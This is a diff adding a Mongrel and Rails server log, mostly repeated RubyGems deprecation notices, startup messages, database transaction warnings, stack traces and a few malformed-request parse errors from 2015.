+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+Fontconfig warning: "/etc/fonts/conf.d/65-droid-sans-fonts.conf", line 103: Having multiple values in <test> isn't supported and may not work as expected
+Fontconfig warning: "/etc/fonts/conf.d/65-droid-sans-fonts.conf", line 138: Having multiple values in <test> isn't supported and may not work as expected
+Fontconfig warning: "/etc/fonts/conf.d/65-droid-sans-fonts.conf", line 103: Having multiple values in <test> isn't supported and may not work as expected
+Fontconfig warning: "/etc/fonts/conf.d/65-droid-sans-fonts.conf", line 138: Having multiple values in <test> isn't supported and may not work as expected
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is no transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+WARNING:  there is already a transaction in progress
+Fri Jun 05 14:50:51 -0430 2015: HTTP parse error, malformed request (169.229.3.93): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>Fri Jun 05 14:50:51 -0430 2015: HTTP parse error, malformed request (169.229.3.94): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+
+Fri Jun 05 14:50:51 -0430 2015: REQUEST DATA: " \n\377\000\n"
+---
+PARAMS: {}
+---
+Fri Jun 05 14:50:51 -0430 2015: REQUEST DATA: " \n\000\377\n"
+---
+PARAMS: {}
+---
+Sat Jun 06 08:38:43 -0430 2015: Read error: #<RuntimeError: No REQUEST PATH>
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:131:in `process_client'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:282:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `each'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+/usr/local/bin/mongrel_rails:23:in `load'
+/usr/local/bin/mongrel_rails:23
+** TERM signal received.
+Tue Jun 09 07:39:19 -0430 2015: Reaping 7 threads for slow workers because of 'shutdown'
+Thread #<Thread:0x7f01419b54a8 sleep> is too old, killing.
+Thread #<Thread:0x7f01419c6ed8 sleep> is too old, killing.Tue Jun 09 07:39:21 -0430 2015: Error calling Dispatcher.dispatch #<Mongrel::TimeoutError: Mongrel timed out this thread: shutdown>
+
+Tue Jun 09 07:39:24 -0430 2015: Error calling Dispatcher.dispatch #<Mongrel::TimeoutError: Mongrel timed out this thread: shutdown>Thread #<Thread:0x7f01419f3690 sleep> is too old, killing./var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:221:in `process'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:159:in `process_client'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:158:in `each'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:158:in `process_client'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:282:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `each'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+/usr/local/bin/mongrel_rails:23:in `load'
+/usr/local/bin/mongrel_rails:23
+
+
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:221:in `process'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:159:in `process_client'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:158:in `each'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:158:in `process_client'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:285:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `initialize'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `new'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel.rb:268:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:282:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `each'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/configurator.rb:281:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:128:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/../lib/mongrel/command.rb:212:in `run'
+/var/lib/gems/1.8/gems/mongrel-1.1.5/bin/mongrel_rails:281
+/usr/local/bin/mongrel_rails:23:in `load'
+/usr/local/bin/mongrel_rails:23Tue Jun 09 07:39:25 -0430 2015: Error calling Dispatcher.dispatch #<Mongrel::TimeoutError: Mongrel timed out this thread: shutdown>** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
